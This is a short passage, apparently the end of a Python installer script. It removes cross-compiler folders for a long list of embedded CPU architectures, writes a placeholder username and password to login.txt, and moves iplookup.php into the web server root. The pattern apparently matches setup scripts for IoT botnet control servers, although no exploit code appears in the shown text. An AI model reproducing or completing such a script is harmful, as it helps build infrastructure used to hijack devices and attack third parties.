...
run("cd")
run("rm -rf cross-compiler-mips")
run("rm -rf cross-compiler-mipsel")
run("rm -rf cross-compiler-sh4")
run("rm -rf cross-compiler-x86_64")
run("rm -rf cross-compiler-armv6l")
run("rm -rf cross-compiler-i686")
run("rm -rf cross-compiler-powerpc")
run("rm -rf cross-compiler-i586")
run("rm -rf cross-compiler-m68k")
run("rm -rf cross-compiler-sparc")
run("rm -rf cross-compiler-armv4l")
run("rm -rf cross-compiler-armv5l")
run("rm -rf cross-compiler-powerpc-440fp")
run("echo username pass>>login.txt")
run("mv iplookup.php /var/www/html/")
exit(1)
